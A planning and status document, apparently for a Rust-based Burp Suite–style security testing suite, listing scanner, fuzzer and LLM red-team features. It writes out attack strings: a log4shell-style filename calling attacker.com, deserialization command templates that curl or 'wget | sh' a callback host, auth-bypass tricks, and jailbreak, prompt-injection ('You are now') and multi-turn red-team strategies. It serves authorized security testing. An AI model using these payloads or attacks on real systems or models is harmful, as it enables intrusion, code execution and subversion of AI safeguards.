# Lancer — Complete Feature Plan

A Rust-based web application security testing suite. Goal: match every feature of Burp Suite (Community + Professional), then surpass on speed.

**Stack:** Rust + `tokio` + `hyper` + `rustls` + `Tauri` (GUI) + `sqlx`/SQLite (storage)

**Legend:** `[F]` = available in Burp Community (Free). `[P]` = Burp Professional only. `[N]` = beyond Burp (Lancer additions).

**Status markers** (added 2026-05-24 after live audit against Burp Suite Community 2026.4.3):
- ✅ Implemented end-to-end (backend code present AND surfaced in GUI)
- 🟡 Partial — backend implemented but GUI surface missing, stubbed, or incomplete
- ❌ Not implemented anywhere
- ⏳ Feature-gated (compiles only with a cargo feature, not wired in default build)

---

# IMPLEMENTATION STATUS — 2026-05-24

Comprehensive audit of `crates/` vs `crates/lancer-gui/web/src/views/` while side-by-side with Burp Community 2026.4.3.

## Status by section
| § | Area | Status | Notes |
|---|------|--------|-------|
| 1 | Proxy | 🟡 | Intercept/HTTP history/Match-replace/CA cert all ✅. WebSockets history tab is a placeholder; HTTP/3 + NTLM/Negotiate auth feature-gated/stubbed; Proxy settings UI shows bind addr only — no upstream proxy / TLS pass-through / DNS override GUI |
| 2 | Target | 🟡 | Site map ✅. Issues ✅ — **batch-13:** Issues tab now has analyst **mark/unmark false-positive** (`PATCH /v1/issues/{id}`), **severity/confidence override** dropdowns, **add manual issue** (`POST /v1/issues`), and a hide-FP toggle. Scope tab still informational only. Engagement tools backends exist (`/v1/engagement/*`) but no GUI menu yet |
| 3 | Repeater | 🟡 | Send + tabs + raw editor + Inspector + Render ✅. batch-12: Burp-AI buttons + Send-to-Sequencer/Comparer/Decoder + Copy-as-fetch/PowerShell now work. Still no HTTP/2 frame editor, no WebSocket mode, no tab rename/group, read-only Inspector |
| 4 | Intruder | 🟡 | 4 attack kinds + payload sets via `/v1/intruder` ✅. **batch-13:** grep-match / grep-extract (start/end→regex) / grep-payloads-reflected now wired GUI→API→`GrepConfig` and rendered as **dynamic result columns**; resource pool (threads/throttle/retries) wired to `IntruderConfig`; API now accepts **typed `payload_specs`** (Numbers/Dates/BruteForce/Null/CharFrobber/BitFlipper/CaseMod/UsernameGen/FromFile) + chained `processors`. Remaining: GUI type-selector to drive payload_specs/processors; save/load attack. §4.6 Mass Fuzz / `lancer-fuzz` still absent |
| 5 | Scanner | ✅ | 30 active + 7 passive checks in `lancer-scanner`. Crawler, API-spec import, OAuth client backend-complete. BCheck DSL runner present. **batch-13:** new **Configuration** subtab — preset selector (Lightweight/Balanced/Deep/AuditOnly/CrawlOnly/PassiveOnly/OwaspTop10) + per-check enable/disable + concurrency/throttle, persisted via `GET/PUT /v1/scan/config` and applied to every subsequent scan |
| 6 | Collaborator | ✅ | batch-13: new **`lancer-oast`** crate — self-hosted OAST server with real DNS (UDP, answers A + records every lookup), HTTP, and SMTP listeners + payload allocation + right-to-left subdomain **correlation engine**. Wired via `/v1/collaborator/{generate,interactions,poll,payloads,status,config,server/start,server/stop}` + new **Collaborator** GUI tab (server start/stop, config, generate-payload→clipboard, live interactions table filtered by DNS/HTTP/SMTP, auto-poll). Defaults to unprivileged ports (5353/8088/1825) so it runs without root. Remaining: scanner-check auto-correlation, RSA-encrypted callbacks, hosted public tier |
| 7 | DOM Invader | 🟡 | `lancer-dom` does **static** DOM-sink / postMessage / proto-pollution gadget analysis. No Chromium browser extension, no augmented-DOM live view |
| 8 | Sequencer | ✅ | `/v1/sequencer/analyse` uses the real `lancer_tools::sequencer` FIPS battery. **batch-13:** GUI no longer fabricates — **Manual load** posts pasted tokens to the backend; **Live capture** uses new `POST /v1/sequencer/capture` which **re-issues the selected request N times and extracts the real token** (cookie/header/body) before analysis. Monobit/Poker/Runs p-values + overall FIPS pass now shown |
| 9 | Decoder | ✅ | batch-12: MD2 / SHA-3-256 / SHA-3-512 routed through `POST /v1/transform` (backend `lancer_core::transform`); octal/binary/gzip + pretty-print JSON present. Remaining: SHA-3-224/384 buttons |
| 10 | Comparer | ✅ | Word + Byte diff, prev/next nav, sync-scroll, soft-wrap, add-from-history selection all present. **batch-13:** added **Hex view** toggle (byte-level diff) and **search-in-diff** (highlight matches) |
| 11 | Organizer | ✅ | Organizer GUI tab present; batch-12 added tag/notes/title edit (`PUT /v1/organizer/{id}`), delete, and Send-to-Repeater. Collections (2025.12 encrypted share link) not implemented |
| 12 | Logger | ✅ | Full table + filters + Request/Response detail panes ✅ (fixed this session). Custom Bambda column scripts not exposed |
| 13 | Built-in browser | 🟡 | "Open Browser" button calls `/api/browser/open` which launches **system** Chrome/Firefox with proxy flags. Not an embedded Chromium with isolated profile. CA cert not auto-installed in the launched browser |
| 14 | Inspector | 🟡 | Repeater Inspector pane shows attribs + counts of params/cookies/headers. Burp lets you **edit** params/cookies/headers via form fields — Lancer is read-only |
| 15 | Command palette | ✅ | Ctrl+K, fuzzy search, backend `/api/palette` query, `lancer-plugin/palette.rs`. Plugin commands register-able |
| 16 | Burp AI | ✅ | batch-12: Repeater Explain/Investigate/Validate buttons POST to `/v1/ai` (BYO-LLM via `lancer-ai`); AI provider config in Settings → AI. AI-enhanced scanner checks still not wired |
| 17 | Session handling | ✅ | `lancer-session` cookie jar + macros + rules complete in backend. **batch-13:** new **Sessions** GUI tab — Session Handling **Rules editor** (name/enabled/tool-scope/url-regex + ordered action builder: SetHeader/SetCookie/UseCookieJar/RunMacro/PromptUser) via `/v1/sessions/rules` CRUD, and **Macros** list (create/run/delete) via `/v1/macros` + `/v1/macros/{id}/run`. Cookie jar now has per-cookie delete (`DELETE /v1/cookies/{key}`). Remaining: in-flight rule application in the proxy pipeline, macro step-recording from Repeater |
| 18 | Project management | 🟡 | SQLite project file ✅. batch-12: **default is now a temporary in-memory project** (unlocks organizer/report/ws-history without `--project`); disk projects auto-snapshot; `GET /v1/project` + `POST /v1/project/{open,new-temporary}`. Still missing GUI open/save dialog, recent list, config library |
| 19 | Reporting | ✅ | HTML/JSON/Markdown/SARIF/XML/PDF all rendered via `lancer-report`. Reports tab works ✅. Jira/Linear/GitHub/DefectDojo exporters in `lancer-report/exporters` — no GUI buttons for them yet |
| 20 | Extensibility | 🟡 | Rhai built-in + WASM (`wasmtime`) + Lua (`mlua`) + Python (`pyo3`) + Native (`cdylib`) + JVM (Montoya, `jni`) all in `lancer-plugin`/`lancer-jvm`. **No plugin manager UI** — can't install/enable/disable plugins from the app. No BApp-store equivalent. No Bambda editor in GUI. No BCheck editor in GUI |
| 21 | CLI / Headless / REST API | ✅ | `lancer-cli` has 29 subcommands. `lancer-api` exposes proxy + history + scan + intruder + repeater + report. **Missing**: Docker image not verified, no documented CI/CD examples |
| 22 | Mobile testing | ✅ | batch-12: new Mobile GUI tab + `/v1/mobile/*` (iOS install steps, .mobileconfig profile, Frida Android/iOS/Flutter scripts). CLI still available |
| 23 | Network settings | 🟡 | batch-12: `GET/PUT /v1/proxy/settings` + Settings → Network GUI (upstream HTTP/SOCKS, TLS pass-through, DNS overrides, platform auth rows). NTLM/Negotiate still placeholder handshakes; listener re-bind applies on restart |
| 24 | UI / UX | 🟡 | Tabbed interface ✅. Command palette ✅. **Missing**: dark/light theme toggle, customizable hotkeys, detachable panels, multi-monitor support, saved workspace layouts, memory footer, status bar quick links |
| 25 | Performance | 🟡 | tokio + hyper ✅, HTTP/3 quinn ⏳, streaming + zero-GC ✅. No benchmark suite to verify "100k+ req/s" claim |
| 26 | Live collab | 🟡 | `lancer-collab` has event stream + peer presence + last-writer-wins. **No GUI** — no peer list, no cursor sync visible in views |
| 27 | AI beyond Burp | 🟡 | BYO-LLM backend ✅. No NL scan config, no AI exploit-chain UI, no AI report writer |
| 28 | New vulnerability classes | ✅ | Web LLM, cloud metadata, prototype pollution, host-header injection all present in `lancer-scanner/active`. WAF fingerprint in `lancer-scanner/waf`. WebAuthn / HTTP/3 desync not visible |
| 29 | eBPF capture (Linux) | ⏳ | `lancer-ebpf` + `lancer-ebpf-probe` compile only with the linux feature. No GUI, no orchestration |
| 30 | Container / Cloud / IaC | ✅ | batch-12: new IaC GUI tab + `POST /v1/iac/parse` (Dockerfile/compose/k8s/Terraform → attack surface) |
| 31 | Plugin system | 🟡 | All hosts exist (see §20). No marketplace, no signed-plugin verification, no install-from-URL |
| 32 | Better reports | ✅ | 6 formats + 4 issue trackers wired in backend |
| 33 | Quality of life | ❌ | No vim/emacs keybindings, no per-project hotkey overrides, no workspace presets, no auto-snapshot, no crash recovery, no payload encyclopedia browser |
| 38 | Upload Scanner | ✅ | batch-11 — `lancer-scanner/src/active/upload.rs` with extension bypass, MIME spoof, magic bytes, SVG XSS, traversal, log4shell-style filenames |
| 39 | API Route Discovery | ✅ | batch-11 — `lancer-api-routes` crate with 200+ route lib + OpenAPI auto-detect; `/v1/api-routes` |
| 40 | Deser. Payload Gen | ✅ | batch-11 — `lancer-deser` crate with 35 Java + .NET chains, 5 encodings; `/v1/deser/{chains,generate}` |
| 41 | Deser. Gadget Probe | ✅ | batch-11 — `lancer-scanner/src/active/gadget_probe.rs` with 15 library classpath fingerprints |
| 42 | LLM Vuln Scanner | ✅ | batch-11 — `lancer-llm-scan` crate, 30+ probes across 10 categories; `/v1/llm-scan/{run,results,estimate}` |
| 43 | LLM Red-Team Orch. | ✅ | batch-11 — `lancer-llm-redteam` crate with 7 strategies (single/TAP/crescendo/PAIR/GCG/FLRT/many-shot); `/v1/llm-redteam/{start,sessions}` |
| 44 | MCP Server Scanner | ✅ | batch-11 — `lancer-mcp-scan` crate with tool poisoning / Unicode tags / homoglyphs / rug-pull diff; `/v1/mcp-scan/{run,results}` |
| 45 | Shodan Enrichment | ✅ | batch-11 — `lancer-shodan` crate with 24h cache + InternetDB fallback; `/v1/shodan/{host,cve}` |
| 46 | Unknown-Injection Scanner | ✅ | batch-11 — `lancer-scanner/src/active/backslash_powered.rs` with response-diff anomaly scoring |
| 47 | AI Repeater Variants | ✅ | batch-11 — `lancer-shadow` crate with 6 mutation families + scoring; `/v1/shadow/generate` |
| 48 | Stateful API Fuzzer | ✅ | batch-11 — `lancer-stateful-fuzz` crate with OpenAPI sequence inference + use-after-free / access-control detectors; `/v1/stateful-fuzz/{start,sessions}` |
| 49 | URL Pipeline Toolkit | ✅ | batch-11 — `lancer url {qsreplace,gf,anew,uro,unfurl,gf-list}` subcommands with 20 gf patterns |
| 50 | CMS-Aware Scanner | ✅ | batch-11 — `lancer-cms` crate covering WordPress/Joomla/Drupal + 7 generic CMSs; `/v1/cms-scan/{run}` |
| 51 | Exploit-DB Lookup | ✅ | batch-11 — `lancer-exploitdb` crate with by-CVE / by-keyword / by-software queries; `/v1/exploits/by-{cve,keyword}` |
| 52 | Modules System | ✅ | batch-11 — `lancer-modules` crate with `LancerModule` trait + 7 default modules (jvm/python/wasm/collab/oast/scheduler/ebpf) + presets; `/v1/modules/*` |

# IMPLEMENTATION STATUS — 2026-05-26 UPDATE

Added 5 bug-bounty-focused tools (all merged into Lancer, no separate apps):
- §5.7 Nuclei-Style Template Engine
- §5.1.1 Deep JS-Rendering Crawler
- §4.6 Mass Fuzz Mode (Intruder extension)
- §34 JS Mining (Passive)
- §19.1–§19.4 Findings Capture + AI Triage

All 5 marked `[N]` (Lancer-only) and `❌` (not yet implemented). Implementation tracked in WORK QUEUE Batch 9 below.

---

# IMPLEMENTATION STATUS — 2026-05-27 UPDATE

After deep research into the 27-tool 2026 AI-era bug bounty toolkit, 8 tools are MERGED into Lancer (proxy-native features that fit a Rust HTTP intercepting workbench). The remaining 19 are kept as SEPARATE clones — each gets its own project folder at `./19/<toolname>/` with its own `plan.md` because they serve fundamentally different domains (smart contract auditing, cloud exploitation, mobile analysis, etc.) and would bloat Lancer if bundled.

## The 8-Tool Merge Set (everything HTTP-in / HTTP-out)

| # | Tool merged | Section in Lancer | Status |
|---|---|---|---|
| 1 | **katana** (deep JS crawler) | §5.1.1 Deep JS-Rendering Crawler | added 2026-05-26 ❌ |
| 2 | **nuclei** (templated scanner) | §5.7 Nuclei-Style Template Engine | added 2026-05-26 ❌ |
| 3 | **ffuf** (content fuzzer) | §4.6 Mass Fuzz Mode | ✅ 2026-06-13 (batch-13) |
| 4 | **jsluice** (JS analysis) | §34 JS Mining (Passive) | added 2026-05-26 ❌ |
| 5 | **trufflehog** (secret patterns) | NEW §35 Passive Secret Scanner | ✅ 2026-05-29 |
| 6 | **interactsh** (OOB testing) | §6 Collaborator (was stub) | full plan below ❌ |
| 7 | **nomore403** (403 bypass) | NEW §36 Auth Bypass Module | ✅ 2026-05-29 |
| 8 | **httpx** (HTTP probing) | NEW §37 Bulk Probe & Site Mapper | ✅ 2026-05-29 |

## §6 Collaborator — full implementation plan (interactsh equivalent)
Previously: ❌ stub in `lancer-scanner/collaborator.rs`. Now full spec:
- [N] Self-hosted OOB server (wildcard DNS A/AAAA/MX, ACME wildcard cert via DNS-01)
- [N] Public Lancer Collaborator (free tier, hosted) — `*.collab.lancer.io`
- [N] Payload generation: DNS, HTTP, HTTPS, SMTP, SMB, LDAP callbacks
- [N] Long-polling client + WebSocket push to GUI
- [N] Per-issue correlation engine — match a callback to the original request that triggered it
- [N] One-click "Insert Collaborator payload" in Repeater / Intruder / Scanner / DOM Invader
- [N] Collaborator history tab with filter/search/export
- [N] DNS rebinding helper for SSRF chains
- [N] Encrypted callback data (RSA — public server can't read client interactions)
- [N] Burp-Collaborator-Client-style protocol so existing Burp users can switch transparently

## §35 Passive Secret Scanner `[N]` ✅
Standalone passive scanner running on EVERY response (not just JS). Complements §34 JS Mining (JS-only).
- [N] 800+ secret regex patterns: AWS access/secret keys, GCP service accounts, Azure tokens, GitHub PATs (classic + fine-grained), GitLab tokens, Slack bot/user tokens, Stripe live/test keys, Twilio SIDs, SendGrid keys, Mailgun, OpenAI/Anthropic API keys, JWTs (decoded + claim inspection), PEM private keys, SSH keys, generic high-entropy strings
- [N] Live verification: call the issuing provider's `whoami`/identity endpoint to confirm the secret is LIVE (massive severity boost — "this is verified active credential" vs "this looks like a secret")
- [N] Entropy fallback (Shannon ≥ 4.0)
- [N] Per-project dedup (don't re-alert on the same secret across requests)
- [N] Severity tiers: verified-live > unverified-format-match > entropy-only
- [N] One-click → Organizer / bounty-platform submission template
- [N] Findings panel column: `Type | Severity | URL | Snippet | Verified?`

## §36 Auth Bypass Module `[N]` ✅
Right-click any 403/401 response → "Try bypasses" → automated mass-test of bypass payloads.
- [N] Path mutations: `/admin` → `/admin/`, `/admin/..`, `/admin/.`, `/admin%20`, `/admin%2f`, `/Admin`, `/ADMIN`, `/admin/x/..`
- [N] Path traversal tricks: `/secret/..;/`, `;/`, `/.;/`, `/..%5c`, `/%2e%2e/`
- [N] Header injection: `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, `X-Custom-IP-Authorization`, `X-Forwarded-Host`, `X-Host`
- [N] HTTP method swap: GET ↔ POST ↔ PUT ↔ PATCH ↔ DELETE ↔ OPTIONS ↔ HEAD ↔ TRACE
- [N] Verb tunneling: `X-HTTP-Method-Override: PUT`, `_method=PUT` form param
- [N] Protocol downgrade: HTTP/2 → HTTP/1.1 → HTTP/1.0
- [N] Trailing-dot trick: `host.com.`
- [N] Findings table: payload → response code → length diff → bypass-likely flag (200 OK or length jump)
- [N] Auto-replay successful bypass to Repeater for manual confirmation

## §37 Bulk Probe & Site Mapper `[N]` ✅
Paste/import a list of hosts (or auto-derive from site map subdomains). Probe each, fingerprint stack, populate scope.
- [N] Concurrent probe (1000+ hosts/sec via tokio)
- [N] Per-host: status code, content-length, title, response time, server header
- [N] Tech detection: Wappalyzer-equivalent fingerprinting (frameworks, CDNs, analytics, CMSs, languages)
- [N] TLS/cert metadata: SANs, issuer, expiry, key algorithm
- [N] CDN detection (Cloudflare, Akamai, Fastly, CloudFront, etc.) — reuses §23 cdncheck-equivalent
- [N] WAF fingerprint (uses §28 WAF library)
- [N] Auto-add live hosts to Target scope
- [N] Screenshot capture (headless Chrome via `chromiumoxide`)
- [N] Output as HTTPQL-searchable table (Caido-style filter DSL)
- [N] CSV / JSON / Markdown / Lancer-project export
- [N] Diff mode: re-probe N days later, alert on new live hosts / status changes / tech changes

---

# IMPLEMENTATION STATUS — 2026-05-30 UPDATE

Cross-reference audit against the 45-tool "won't-be-made-useless-by-AI" master list (`NHTanvir/tools/readme.md`). After auditing the actual `crates/` code (not just plan markers), 10 tools were genuinely missing from both the 22-clone set and Lancer's merged feature set. Resolution:

- **3 added as new D:/19/ clones** — jadx (#20), APKTool (#21), Slither (#22) — domain-specific tools that would bloat Lancer if merged
- **7 added as new Lancer feature sections** below — §38 through §44 — proxy-native / scanner-native features that belong inside the workbench

## §38 Upload Scanner `[N]` ❌

Active scan check for file-upload functions. New `lancer-scanner/src/active/upload.rs`. Triggers on multipart/form-data requests or any endpoint that accepts `Content-Type: image/*`, `application/pdf`, etc.

- [N] Detect file-upload endpoints from request analysis (multipart boundaries, Content-Disposition with filename, FileReader-style API calls)
- [N] Test extension blacklist bypass: `shell.php.jpg`, `shell.pHp`, `shell.php%00.jpg`, `shell.php;jpg`, `shell.php5/.phtml/.phar/.pht/.phps`
- [N] Test MIME-type spoofing: upload PHP with `Content-Type: image/jpeg`
- [N] Test magic-byte prepending: `\xff\xd8\xff\xe0` (JPEG header) + PHP body
- [N] Polyglot uploads: GIFAR (GIF + JAR), JPEG with embedded XML/SVG
- [N] SVG with embedded `<script>` (XSS via uploaded SVG)
- [N] Path traversal in filename: `../../../shell.php`, `..\..\shell.aspx`
- [N] Filename injection: `${jndi:ldap://attacker.com/x}` (log4shell-style)
- [N] Race condition: rapid upload + access before validator deletes the file
- [N] Content-Type confusion: server validates by header, parses by extension
- [N] Stored-XSS test via uploaded HTML/SVG/PDF (with embedded JS)
- [N] DoS test: zip-bomb upload (configurable threshold so we don't actually DoS)
- [N] One-click "extract upload endpoint to §39 API Route Discovery" for further fuzzing
- [N] Integration with §6 Collaborator: upload a `.php` that pings the OOB server (confirms code execution)

## §39 API Route Discovery `[N]` ❌

API-aware route discovery (kiterunner equivalent). New `lancer-scanner/src/api_routes.rs` + `lancer-tools/src/route_discover.rs`. Beats dir-bruteforce on REST APIs because it knows route templates, common verbs, and content negotiation.

- [N] Route schema database: 10,000+ known API route templates extracted from OpenAPI specs, Postman collections, GitHub crawls, GraphQL schemas
- [N] Schema groups: `aws/`, `gcp/`, `azure/`, `k8s/`, `stripe/`, `twilio/`, `github/`, `gitlab/`, `slack/`, generic REST patterns (`/api/v{1..3}/{resource}`, `/api/{resource}/{id}/{subresource}`)
- [N] Method fanout: every discovered route is probed with GET/POST/PUT/PATCH/DELETE/OPTIONS/HEAD
- [N] Content-Type fanout: `application/json`, `application/xml`, `application/x-www-form-urlencoded`, `multipart/form-data`
- [N] Header fanout: `Accept: application/json` vs `Accept: */*` (some APIs only respond with JSON requested)
- [N] Smart distinguishment: 200 with body length variance > σ vs all-uniform-404
- [N] OpenAPI/Swagger spec auto-detection: if `/swagger.json`, `/openapi.json`, `/api-docs`, `/v2/api-docs` returns valid JSON, switch to spec-driven mode (zero noise)
- [N] GraphQL introspection: `/graphql`, `/api/graphql`, `/query`
- [N] Versioned API enumeration: try `/v1`, `/v2`, `/v3` automatically
- [N] Auth bypass cross-probe: discover route → re-test with §36 Auth Bypass Module
- [N] Reuses §4.6 Mass Fuzz Mode tokio HTTP client (HTTP/2 multiplexing for free)
- [N] Output: discovered routes → §2.1 Site Map + §19 Findings (if unauth + sensitive)
- [N] AI route prediction: paste a few discovered endpoints, `lancer-ai` predicts more (e.g., found `/api/users` and `/api/orders` → predicts `/api/payments`, `/api/refunds`)

## §40 Deserialization Payload Generator `[N]` ❌

Java/.NET deserialization gadget-chain payload generator (ysoserial equivalent). New `lancer-tools/src/deser_payload.rs` + `lancer-cli/src/commands/ysoserial.rs`. Distinct from §5.2 deserialization *detection* — this generates exploit payloads.

- [N] Java gadget chains: `CommonsCollections1-7`, `CommonsBeanutils1`, `Spring1`, `Spring2`, `Groovy1`, `Hibernate1-2`, `JBossInterceptors1`, `JSON1`, `MozillaRhino1-2`, `Vaadin1`, `Click1`, `Clojure`, `JavassistWeld1`, `JdkUtil`, `ROME`, `Wicket1`, `URLDNS` (detection-only)
- [N] .NET gadget chains: `TypeConfuseDelegate`, `TextFormattingRunProperties`, `ResourceSet`, `ActivitySurrogateSelector`, `BinaryFormatter`, `SoapFormatter`, `Json.NET`, `ObjectStateFormatter`, `LosFormatter`, `WindowsIdentity`
- [N] Payload encoding: raw bytes / base64 / hex / URL-encoded / form-encoded
- [N] Command payload templates: `cmd /c calc.exe`, `bash -c "curl <collab>/$(whoami)"`, `wget -O- <collab> | sh`, OS-aware fallback
- [N] Collaborator integration: auto-substitute `<collab>` with a fresh §6 Collaborator payload, then watch for callback
- [N] One-click "send payload into selected request body" in Repeater
- [N] One-click "use as Intruder payload set" (mass-test all chains against a single endpoint)
- [N] Library fingerprint linking: if §41 GadgetProbe found `commons-collections:3.1` → suggest `CommonsCollections1`/`CommonsCollections5`
- [N] CLI: `lancer-cli ysoserial --chain CommonsCollections1 --cmd 'curl <collab>/x' --encode base64`
- [N] No malicious payload execution against unauthorized targets — gate behind explicit `--target-authorized` flag

## §41 Deserialization Gadget Probe `[N]` ❌

Detects which Java deserialization gadgets/libraries a target classpath exposes (GadgetProbe equivalent). New `lancer-scanner/src/active/gadget_probe.rs`.

- [N] Send serialized objects that reference specific class names + a Collaborator-pingback payload as the value
- [N] If the target classpath contains that class, the deserialization triggers the pingback → confirmed presence
- [N] Probe library: 200+ class names from popular Java libraries (`org.apache.commons.collections.functors.InvokerTransformer`, `org.codehaus.groovy.runtime.MethodClosure`, `bsh.XThis`, `com.sun.rowset.JdbcRowSetImpl`, `org.springframework.beans.factory.ObjectFactory`, etc.)
- [N] Version fingerprinting: differential class presence pins library to a version range
- [N] Auto-chain into §40 Payload Generator: discovered library → suggest matching gadget chain
- [N] Heap-snapshot probing for .NET (when ASP.NET ViewState is present)
- [N] Output: classpath fingerprint → §2.1 Site Map host record + §19 Findings
- [N] Requires §6 Collaborator (callback-based detection — no in-band signal)

## §42 LLM Vulnerability Scanner `[N]` ❌

Garak equivalent — runs 120+ probes against an LLM endpoint. New `lancer-llm-scan` crate. New "LLM Scan" tab in GUI. API: `POST /v1/llm-scan/run`, `GET /v1/llm-scan/results`.

- [N] Probe categories (target = LLM API endpoint user configures):
  - `prompt_injection` — direct injection, indirect injection, instruction smuggling
  - `jailbreak` — DAN, AIM, persona-prompt evasions (configurable, only against authorized targets)
  - `data_leakage` — PII extraction, training-data extraction, model-card leakage
  - `hallucination` — factual benchmark probes (TruthfulQA-style)
  - `toxicity` — RealToxicityPrompts subset
  - `bias` — BBQ benchmark probes
  - `code_generation` — security flaws in generated code (SQLi/XSS/SSRF/cmd-inject)
  - `tool_misuse` — agent-mode probes: trick the model into calling a tool with malicious args
  - `prompt_extraction` — system-prompt recovery via repetition / token-leak / unicode tricks
  - `xml_injection` — `<system>You are now…</system>` injection
- [N] Detector library per probe: regex / classifier / semantic-similarity / LLM-judge (uses `lancer-ai`)
- [N] Supports OpenAI / Anthropic / Google / Ollama / OpenRouter / generic OpenAI-compatible (reuses `lancer-ai` adapters)
- [N] Result format: per-probe pass/fail/inconclusive + severity + reproducer prompt
- [N] CSV / JSON / Markdown report + §19 Findings integration
- [N] Optional: replay through Lancer proxy (so all LLM traffic is captured in HTTP history)
- [N] Rate-limit awareness — auto-throttle to provider tier
- [N] Cost estimator — pre-flight token count + price prediction
- [N] CLI: `lancer-cli llm-scan --target https://api.example.com/chat --probes prompt_injection,jailbreak,data_leakage`

## §43 LLM Red-Team Orchestrator `[N]` ❌

PyRIT equivalent — multi-turn adversarial conversations against an LLM. New `lancer-llm-redteam` crate. New "LLM Red-Team" tab. API: `POST /v1/llm-redteam/start`, `GET /v1/llm-redteam/sessions/{id}`.

- [N] Attack strategies as composable building blocks:
  - `single_turn` — fire one prompt, evaluate
  - `tree_of_attacks` — TAP — branch the conversation, prune low-scoring branches, depth-first search for a successful jailbreak
  - `crescendo` — gradually escalate the request over N turns (each turn reframes the previous answer as legitimate context)
  - `pair` — Prompt Automatic Iterative Refinement — attacker LLM rewrites its own prompt based on target response
  - `gcg` — Greedy Coordinate Gradient (white-box adversarial suffix; only against models with logit access)
  - `flrt` — Flipped attack / Latent reasoning trick
  - `many_shot` — exploit long-context with N-shot demonstrations of forbidden behavior
- [N] Attacker LLM ≠ target LLM (attacker is your `lancer-ai` config; target is the system under test)
- [N] Scorer module: per-attempt scoring (custom classifier / LLM-judge / regex). Stop on threshold.
- [N] Memory: full conversation history per session, replayable, exportable
- [N] Multi-target: run the same attack against N targets in parallel for differential scoring
- [N] Built-in target adapters: chat completions, agent w/ tools, Vision models (image + text), RAG endpoints (poison the retrieval)
- [N] Conversation replay UI: tree visualization of TAP/PAIR runs
- [N] Findings export: each successful adversarial turn → §19 Finding with full conversation as evidence
- [N] CLI: `lancer-cli llm-redteam --strategy tree_of_attacks --target <url> --goal "extract system prompt" --max-turns 10`

## §44 MCP Server Scanner `[N]` ❌

MCP-scan equivalent — scans Model Context Protocol servers for tool-poisoning + prompt-injection + insecure-tool issues. New `lancer-mcp-scan` crate. API: `POST /v1/mcp-scan/run`.

- [N] MCP transport support: stdio (subprocess), SSE, WebSocket, HTTP
- [N] Discovery: connect to server, enumerate `tools/list`, `resources/list`, `prompts/list`, `roots/list`
- [N] Tool-description analysis: scan each tool's description string for hidden instructions / prompt injection / unicode tag tricks / steganography / homoglyphs
- [N] Tool-parameter analysis: detect overly permissive params (free-form `command`, `path`, `url`)
- [N] Rug-pull detection: snapshot tool descriptions; on re-scan, alert if any description silently changed
- [N] Cross-server tool collision: detect two MCP servers exposing a same-named tool with different behaviors (shadowing attack)
- [N] Resource enumeration: list every URI the server says it can read; check for path traversal / arbitrary file access
- [N] Roots policy check: verify the server respects its declared `roots/list` (no out-of-roots reads)
- [N] Sampling abuse: detect servers that demand `sampling/createMessage` for sensitive operations (potential prompt-injection sink)
- [N] Differential mode: scan the same server with two different auth tokens (admin vs guest) — alert on tools exposed to guest that shouldn't be
- [N] Output: per-server report — every tool + its risk score + flagged issues
- [N] Integration: if Lancer GUI uses MCP servers itself, auto-scan them on first connect and warn user
- [N] Findings export to §19 Findings
- [N] CLI: `lancer-cli mcp-scan --server stdio://./my-mcp-server --depth full`

---

# IMPLEMENTATION STATUS — 2026-05-31 UPDATE

Second-pass audit against the 67-tool "won't-be-made-useless-by-AI" master list (`D:/d.md`). After cross-referencing with the 22-clone set and Lancer's merged feature set, 7 more tools belong INSIDE Lancer (proxy-workflow / HTTP-in-HTTP-out) and 8 more need their own `D:/19/` clones (domain-specific, would bloat Lancer). 10 others skipped as out-of-scope (OS-level, gigantic frameworks, defensive ML guardrails, or note-taking apps).

## §45 Shodan Host Enrichment `[N]` ❌

Right-click any host in §2.1 Site Map → "Shodan lookup" → inline Shodan data without leaving Lancer. New `lancer-shodan` crate (~300 LOC, thin API client). API: `GET /v1/shodan/{host}`, `GET /v1/shodan/cves/{cve}`.

- [N] Shodan REST API client with `SHODAN_API_KEY` env var auth
- [N] `host(ip)` → ports / banners / hostnames / OS / vulns / tags / last_update
- [N] `cve(cve_id)` → CVSS / EPSS / KEV flag / references
- [N] `search(query)` → first-N results (paginated)
- [N] Per-host cache (24h TTL) so re-opening a Site Map node doesn't burn API quota
- [N] Inline detail pane in §2.1 host detail showing Shodan banner + open ports highlighted
- [N] Right-click → "Shodan search /facets" for tag-based pivoting (e.g., `org:"Cloudflare"`)
- [N] Auto-mark hosts as "internet-exposed" in Lancer scope if Shodan has a record
- [N] Optional InternetDB free-tier fallback (no key required, smaller dataset)
- [N] CVE column in §19 Findings auto-enriched with Shodan KEV/EPSS data

## §46 Unknown-Injection Scanner `[N]` ❌

Active scan check that finds **unknown** classes of injection by response-diffing the target. New `lancer-scanner/src/active/backslash_powered.rs`. Equivalent to James Kettle's backslash-powered-scanner Burp extension.

- [N] Send probe payloads designed to break parsers in distinctive ways: `\`, `\\`, `\0`, `''`, `""`, `${`, `{{`, `<%`, `[`, `]`, `(`, `)`, `&apos;`, `&#39;`, ``, `\xff`, `\n`, `\r\n`, mixed quote styles
- [N] Diff each response against baseline: status, length, render time, headers, body word frequency, error-message presence
- [N] Statistical scoring: an injection point is anomalous if response signature for `\` differs significantly from baseline AND from `\\` (parser error) but matches for benign escapes
- [N] Build issue with "unknown injection class — manual investigation required" + diff evidence
- [N] Per-position scoring across URL params, body, headers, cookies, JSON keys, path segments
- [N] Reuse §6 Collaborator for blind variants (payload that pings collab if interpolated)
- [N] AI-assist mode: feed the anomalous diff to `lancer-ai`, ask "what injection class is this?" — confidence-scored hypothesis
- [N] One-click "send to Repeater" with the most-divergent payload pre-loaded for manual exploitation
- [N] Integration with §19 Findings: even low-confidence anomalies are saved for triage

## §47 AI Repeater Variants `[N]` ❌

Extends §16 Burp AI in Repeater. PortSwigger's Shadow Repeater equivalent. Wired into existing `lancer-ai`. New "Shadow" toggle in Repeater toolbar.

- [N] Each time the user clicks Send manually, an LLM background pass generates 3-5 mutation variants (param value tweaks, header additions, encoding changes, case flips, path traversal additions)
- [N] Variants run in the background through the same proxy, their responses scored against the baseline
- [N] If a variant's response substantially differs (200 → 500, length jump, new error revealed), surface as a "shadow hit" notification
- [N] User can promote any shadow variant to a real Repeater tab with one click
- [N] Mutation strategy panel: pick which families to use (auth bypass / IDOR / injection / encoding / parameter pollution)
- [N] Per-tab on/off toggle (shadow mode burns LLM credits — opt-in)
- [N] Cost meter in toolbar (LLM tokens spent on shadow this session)
- [N] Cached suggestions — same baseline request hash reuses the previous mutation set
- [N] CLI: `lancer-cli shadow <request.http>` — one-shot variant generation outside the GUI

## §48 Stateful API Fuzzer `[N]` ❌

